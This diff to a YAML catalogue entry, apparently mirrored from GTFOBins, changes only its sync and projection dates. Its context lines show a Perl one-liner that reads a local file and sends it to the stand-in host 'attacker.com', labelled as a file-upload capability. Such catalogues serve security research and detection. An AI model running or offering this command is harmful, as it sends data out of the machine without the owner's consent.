@@ -12,7 +12,7 @@ sources:
   upstream_url: https://gtfobins.github.io
   license: GPL-3.0
   upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
-  last_synced: '2026-11-14'
+  last_synced: '2026-11-16'
 commands:
 - template: 'perl -MIO::Socket::INET -e ''$s = new IO::Socket::INET(PeerAddr=>"attacker.com", PeerPort=>80,
     Proto=>"tcp") or die;open(my $file, "<", "/path/to/input-file") or die;$content = join("", <$file>);close($file);$headers
@@ -80,7 +80,7 @@ source_data:
               receiver: http-server
     upstream_url: https://gtfobins.github.io/gtfobins/perl/
     upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
-    last_synced: '2026-11-14'
+    last_synced: '2026-11-16'
 enrichment:
   capabilities:
   - value: file-upload
@@ -109,6 +109,6 @@ enrichment:
 _meta:
   schema_version: 1
   generated_by: loldex-projection
-  projected_at: '2026-11-14'
+  projected_at: '2026-11-16'
   source_hashes:
     GTFOBins: sha256:8ab855b4e490b3ec74315086149053478ab37dd947586c862778fdad1596be28
